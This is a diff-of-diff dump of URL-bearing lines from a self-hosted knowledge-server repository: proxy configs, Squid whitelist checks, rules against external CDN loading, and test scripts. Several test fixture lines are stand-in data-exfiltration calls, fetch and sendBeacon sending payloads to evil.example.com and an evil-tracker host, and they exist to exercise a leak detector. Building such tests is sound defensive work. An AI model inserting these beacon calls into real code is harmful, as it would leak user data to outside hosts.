@@ -1,0 +1,160 @@
+40:-- **TUYỆT ĐỐI KHÔNG** sử dụng các thẻ `<link>` hoặc `<script>` để tải tài nguyên (CSS, JS, Fonts, Images) từ các external CDN (như `fonts.googleapis.com`, `cdnjs`, `unpkg`, v.v.).
+126:-6. Squid whitelist integrity (chặn wildcard `.googleapis.com`)
+142:-| `generativelanguage.googleapis.com` | Google Gemini (LLM, OCR, Embedding) | ✅ |
+143:-| `.googleapis.com` (wildcard) | Quá rộng — analytics/firebase/drive | ❌ |
+210:--- **TUYỆT ĐỐI KHÔNG** sử dụng các thẻ `<link>` hoặc `<script>` để tải tài nguyên (CSS, JS, Fonts, Images) từ các external CDN (như `fonts.googleapis.com`, `cdnjs`, `unpkg`, v.v.).
+296:--6. Squid whitelist integrity (chặn wildcard `.googleapis.com`)
+312:--| `generativelanguage.googleapis.com` | Google Gemini (LLM, OCR, Embedding) | ✅ |
+313:--| `.googleapis.com` (wildcard) | Quá rộng — analytics/firebase/drive | ❌ |
+932:--  'generativelanguage\.googleapis\.com'
+933:--  'oauth2\.googleapis\.com'
+950:--# Matches strings like "https://api.openai.com/v1/...", '/api/users', `https://localhost:3000/x`.
+1779:--      "(fonts\.googleapis\.com|fonts\.gstatic\.com|cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net|cdn\.tailwindcss\.com)" {} + 2>/dev/null \
+1799:--  if grep -Eq "^[[:space:]]*acl[[:space:]]+whitelisted_domains[[:space:]]+dstdomain[[:space:]]+\.googleapis\.com([[:space:]]|$)" "$SQUID_CONF"; then
+1800:--    fail "Squid whitelist has bare .googleapis.com wildcard — overly broad"
+1932:--       "(fonts\.googleapis\.com|fonts\.gstatic\.com|cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net)"; then
+2320:-diff --git a/.agent/workflows/test/fixtures/cdn-leak.patch b/.agent/workflows/test/fixtures/cdn-leak.patch
+2323:---- a/.agent/workflows/test/fixtures/cdn-leak.patch
+2336:--+    href="https://fonts.googleapis.com/css2?family=Inter&display=swap"
+2382:--+  await fetch("https://evil.example.com/collect", {
+2387:--+  navigator.sendBeacon("https://evil.example.com/beacon", JSON.stringify(payload));
+2454:--  cdn-leak.patch
+2980:--  const res = await fetch("https://api.openai.com/v1/chat/completions", {
+2991:--  await fetch("https://collect.evil-tracker.example/event", {
+3006:--  ai_host=$(extract_url_host 'await fetch("https://api.openai.com/v1/chat/completions"')
+3010:--  evil_host=$(extract_url_host 'await fetch("https://collect.evil-tracker.example/event"')
+3513:--  "$schema": "https://json.schemastore.org/claude-code-settings.json",
+5728:--git clone https://github.com/claudekit/claudekit-engineer.git
+6224:--Monitoring: https://monitoring.example.com/v1.2.0
+6366:--**Recommendation**: Use a tool like [Coolors](https://coolors.co) or your design tool to generate accessible color combinations.
+6958:--All notable changes to claudekit-engineer are documented here. This file follows [Semantic Versioning](https://semver.org/) and [Keep a Changelog](https://keepachangelog.com/) conventions.
+7106:--**claudekit-engineer** follows [Semantic Versioning](https://semver.org/):
+7173:--- **Bug Reports**: [GitHub Issues](https://github.com/claudekit/claudekit-engineer/issues)
+7174:--- **Feature Requests**: [GitHub Discussions](https://github.com/claudekit/claudekit-engineer/discussions)
+7190:--- See [historical releases](https://github.com/claudekit/claudekit-engineer/releases?page=2)
+8122:- NEXT_PUBLIC_API_URL=http://localhost:5055
+8144:- NEXT_PUBLIC_API_URL=http://localhost:5055
+8347:--# See https://help.github.com/articles/ignoring-files/ for more about ignoring files.
+8540:-@@ -5,6 +5,568 @@ Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
+9321:-+      "url": "http://localhost:8000/mcp",
+9373:-+> **Arkon is built for teams, not individuals.** If you're looking for a personal knowledge setup, [Obsidian](https://obsidian.md) + Claude Skills is a much simpler fit.
+9390:--      "url": "https://your-arkon-server/mcp",
+9398:-+- **URL:** `https://your-arkon-server/mcp`
+9434:-+[![Star History Chart](https://api.star-history.com/svg?repos=nduckmink/arkon&type=Date)](https://star-history.com/#nduckmink/arkon&Date)
+10880:- # Claude Desktop connects to: https://your-server/mcp
+13535:-+  <link rel="preconnect" href="https://fonts.googleapis.com">
+13536:-+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+13537:-+  <link href="https://fonts.googleapis.com/css2?family=EB+Garamond:wght@400;500&family=Manrope:wght@400;500;600&display=swap" rel="stylesheet">
+18947:-+            # proxy that terminates TLS — presigned URLs must use https://.
+19654:--    # Remove // line comments (avoid stripping URLs like https://)
+19979:--  error "Docker is not installed. Install Docker Desktop from https://www.docker.com/"
+20156:--echo -e "  Frontend (Admin UI)  →  ${GREEN}http://localhost:${FRONTEND_PORT}${RESET}"
+20157:--echo -e "  Backend API          →  ${GREEN}http://localhost:${API_PORT}${RESET}"
+20158:--echo -e "  API Docs (Swagger)   →  ${GREEN}http://localhost:${API_PORT}/docs${RESET}"
+20159:--echo -e "  MinIO Console        →  ${GREEN}http://localhost:${MINIO_CONSOLE_PORT}${RESET}"
+20185:--    - HTTP_PROXY=http://squid:3128
+20186:--    - HTTPS_PROXY=http://squid:3128
+20266:-              "import urllib.request; urllib.request.urlopen('http://localhost:5055/health')"]
+20279:-       - NEXT_PUBLIC_API_URL=${NEXT_PUBLIC_API_URL:-http://localhost:5055}
+20280:-       - INTERNAL_API_URL=http://api:5055
+20610:--| Admin UI (Frontend) | http://localhost:3119 |
+20611:--| Backend API | http://localhost:5055 |
+20612:--| API Swagger Docs | http://localhost:5055/docs |
+20613:--| Health check | http://localhost:5055/health |
+20614:--| MinIO Console | http://localhost:9003 |
+20628:--| `NEXT_PUBLIC_API_URL` | `http://localhost:5055` | URL API mà browser dùng |
+20630:--Để deploy trên server với domain thật, đổi `NEXT_PUBLIC_API_URL` thành URL công khai của API (ví dụ `https://arkon.yourcompany.com`).
+20722:-+      "url": "http://localhost:5055/mcp"
+20736:-       "url": "http://localhost:5055/mcp",
+20786:--      "url": "https://your-arkon-server/mcp",
+20790:-+      "url": "https://your-arkon-server/mcp"
+20816:-+| Remote MCP server URL | `https://your-arkon-server/mcp` |
+21074:-+| Login form shows `http://` URLs instead of `https://` | Uvicorn not started with `--proxy-headers` — ensure `X-Forwarded-Proto` is forwarded by your reverse proxy |
+21115:-+- The API specifically needs `X-Forwarded-Proto` passed through so OAuth URLs are generated with `https://`
+21122:-@@ -198,60 +223,104 @@ Open `http://<server-ip>:3119` from your browser and log in.
+21147:-     return 301 https://$host$request_uri;
+21163:--        proxy_pass http://localhost:3119;
+21172:--        proxy_pass http://localhost:5055;
+21181:--        proxy_pass http://localhost:5055;
+21183:-+        proxy_pass http://127.0.0.1:5055;
+21188:-+        proxy_set_header X-Forwarded-Proto $scheme;   # required for OAuth https:// URLs
+21195:-+        proxy_pass http://127.0.0.1:5055;
+21200:-+        proxy_set_header X-Forwarded-Proto $scheme;   # required for OAuth https:// URLs
+21222:--        proxy_pass http://localhost:9000;
+21223:-+        proxy_pass http://127.0.0.1:9000;
+21232:-+> **`X-Forwarded-Proto $scheme` is critical.** Without it, Arkon's OAuth metadata endpoint returns `http://` URLs, and Claude Desktop will fail to complete the OAuth flow.
+21249:- NEXT_PUBLIC_API_URL=https://arkon.yourcompany.com
+21251:- CORS_ORIGINS=https://arkon.yourcompany.com
+21284:-+- **URL:** `https://arkon.yourcompany.com/mcp`
+21299:-+| OAuth login form shows `http://` URLs | Nginx not forwarding `X-Forwarded-Proto` — add `proxy_set_header X-Forwarded-Proto $scheme;` to both `/mcp` and `/` location blocks |
+21729:-         "url": "https://github.com/sponsors/wooorm"
+21734:--      "resolved": "https://registry.npmjs.org/material-symbols/-/material-symbols-0.44.8.tgz",
+21740:-       "resolved": "https://registry.npmjs.org/math-intrinsics/-/math-intrinsics-1.1.0.tgz",
+21936:-+    const base = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5055";
+24405:-+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+24406:-+        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
+24409:-+          href="https://fonts.googleapis.com/css2?family=EB+Garamond:wght@400..800&family=Manrope:wght@200..800&display=swap"
+24413:-+          href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap"
+25742:--                  ? "http://host.docker.internal:1234/v1"
+25743:--                  : "e.g. http://host.docker.internal:1234/v1"
+25767:--                For local integration like LM Studio, enter <code className="bg-muted px-1 py-0.5 rounded text-[9px] font-mono">http://host.docker.internal:1234/v1</code>.
+26141:--                  ? "http://host.docker.internal:1234/v1"
+26142:--                  : "e.g. http://host.docker.internal:1234/v1"
+26500:-+            placeholder="https://relay.example.com/arkon"
+29964:--export const API_BASE = process.env.NEXT_PUBLIC_API_URL !== undefined ? process.env.NEXT_PUBLIC_API_URL : "http://localhost:5055";
+29965:-+const API_BASE = process.env.NEXT_PUBLIC_API_URL !== undefined ? process.env.NEXT_PUBLIC_API_URL : "http://localhost:5055";
+39099:--# Google Gemini API (LLM, embedding, vision/OCR) — only this subdomain, NOT .googleapis.com wildcard
+39100:--acl whitelisted_domains dstdomain generativelanguage.googleapis.com
+39102:--acl whitelisted_domains dstdomain oauth2.googleapis.com
+39110:--# DO NOT add .googleapis.com or .google.com — covers analytics/firebase/drive/etc.
+39668:--- **TUYỆT ĐỐI KHÔNG** sử dụng các thẻ `<link>` hoặc `<script>` để tải tài nguyên (CSS, JS, Fonts, Images) từ các external CDN (như `fonts.googleapis.com`, `cdnjs`, `unpkg`, v.v.).
+39754:--6. Squid whitelist integrity (chặn wildcard `.googleapis.com`)
+39770:--| `generativelanguage.googleapis.com` | Google Gemini (LLM, OCR, Embedding) | ✅ |
+39771:--| `.googleapis.com` (wildcard) | Quá rộng — analytics/firebase/drive | ❌ |
+40390:--  'generativelanguage\.googleapis\.com'
+40391:--  'oauth2\.googleapis\.com'
+40408:--# Matches strings like "https://api.openai.com/v1/...", '/api/users', `https://localhost:3000/x`.
+41237:--      "(fonts\.googleapis\.com|fonts\.gstatic\.com|cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net|cdn\.tailwindcss\.com)" {} + 2>/dev/null \
+41257:--  if grep -Eq "^[[:space:]]*acl[[:space:]]+whitelisted_domains[[:space:]]+dstdomain[[:space:]]+\.googleapis\.com([[:space:]]|$)" "$SQUID_CONF"; then
+41258:--    fail "Squid whitelist has bare .googleapis.com wildcard — overly broad"
+41390:--       "(fonts\.googleapis\.com|fonts\.gstatic\.com|cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net)"; then
+41778:-diff --git a/.agent/workflows/test/fixtures/cdn-leak.patch b/.agent/workflows/test/fixtures/cdn-leak.patch
+41781:---- a/.agent/workflows/test/fixtures/cdn-leak.patch
+41794:--+    href="https://fonts.googleapis.com/css2?family=Inter&display=swap"
+41840:--+  await fetch("https://evil.example.com/collect", {
+41845:--+  navigator.sendBeacon("https://evil.example.com/beacon", JSON.stringify(payload));
+41912:--  cdn-leak.patch
+42438:--  const res = await fetch("https://api.openai.com/v1/chat/completions", {
+42449:--  await fetch("https://collect.evil-tracker.example/event", {
+42464:--  ai_host=$(extract_url_host 'await fetch("https://api.openai.com/v1/chat/completions"')
+42468:--  evil_host=$(extract_url_host 'await fetch("https://collect.evil-tracker.example/event"')
+42971:--  "$schema": "https://json.schemastore.org/claude-code-settings.json",
+45186:--git clone https://github.com/claudekit/claudekit-engineer.git
+45682:--Monitoring: https://monitoring.example.com/v1.2.0
+45824:--**Recommendation**: Use a tool like [Coolors](https://coolors.co) or your design tool to generate accessible color combinations.
+46416:--All notable changes to claudekit-engineer are documented here. This file follows [Semantic Versioning](https://semver.org/) and [Keep a Changelog](https://keepachangelog.com/) conventions.
+46564:--**claudekit-engineer** follows [Semantic Versioning](https://semver.org/):
+46631:--- **Bug Reports**: [GitHub Issues](https://github.com/claudekit/claudekit-engineer/issues)
+46632:--- **Feature Requests**: [GitHub Discussions](https://github.com/claudekit/claudekit-engineer/discussions)
+46648:--- See [historical releases](https://github.com/claudekit/claudekit-engineer/releases?page=2)
+47580:- NEXT_PUBLIC_API_URL=http://localhost:5055
+47602:- NEXT_PUBLIC_API_URL=http://localhost:5055
+47805:--# See https://help.github.com/articles/ignoring-files/ for more about ignoring files.
+47998:-@@ -5,6 +5,568 @@ Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
+48779:-+      "url": "http://localhost:8000/mcp",
+48831:-+> **Arkon is built for teams, not individuals.** If you're looking for a personal knowledge setup, [Obsidian](https://obsidian.md) + Claude Skills is a much simpler fit.
+48848:--      "url": "https://your-arkon-server/mcp",
+48856:-+- **URL:** `https://your-arkon-server/mcp`
+48892:-+[![Star History Chart](https://api.star-history.com/svg?repos=nduckmink/arkon&type=Date)](https://star-history.com/#nduckmink/arkon&Date)
+50338:- # Claude Desktop connects to: https://your-server/mcp
+52993:-+  <link rel="preconnect" href="https://fonts.googleapis.com">
+52994:-+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+52995:-+  <link href="https://fonts.googleapis.com/css2?family=EB+Garamond:wght@400;500&family=Manrope:wght@400;500;600&display=swap" rel="stylesheet">
+58405:-+            # proxy that terminates TLS — presigned URLs must use https://.
+59112:--    # Remove // line comments (avoid stripping URLs like https://)
+59437:--  error "Docker is not installed. Install Docker Desktop from https://www.docker.com/"
+59614:--echo -e "  Frontend (Admin UI)  →  ${GREEN}http://localhost:${FRONTEND_PORT}${RESET}"
+59615:--echo -e "  Backend API          →  ${GREEN}http://localhost:${API_PORT}${RESET}"
+59616:--echo -e "  API Docs (Swagger)   →  ${GREEN}http://localhost:${API_PORT}/docs${RESET}"
+59617:--echo -e "  MinIO Console        →  ${GREEN}http://localhost:${MINIO_CONSOLE_PORT}${RESET}"
+59643:--    - HTTP_PROXY=http://squid:3128
